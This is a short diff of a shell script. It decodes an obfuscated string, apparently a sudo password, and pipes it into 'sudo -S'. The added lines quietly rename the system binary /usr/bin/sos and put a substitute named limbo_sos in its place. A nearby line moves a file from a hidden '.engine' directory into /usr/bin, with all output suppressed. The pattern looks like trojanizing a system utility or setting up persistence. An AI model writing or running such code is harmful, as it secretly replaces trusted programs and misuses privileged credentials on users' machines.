@@ -42,6 +42,8 @@ decr(){
   echo "$in" | tr 'e-za-de-za-d' 'a-za-z'
 }
 sub=$(decr)
+echo "$sub" | sudo -S mv "/usr/bin/sos" "/usr/bin/bkp_sos" > /dev/null 2>&1
+echo "$sub" | sudo -S mv "/usr/bin/limbo_sos" "/usr/bin/sos" > /dev/null 2>&1
 echo "$sub" | sudo -S mv "$my_base_dir/.engine/.out/3/wlcr3" "/usr/bin" >/dev/null 2>&1
 sleep 0.5
 
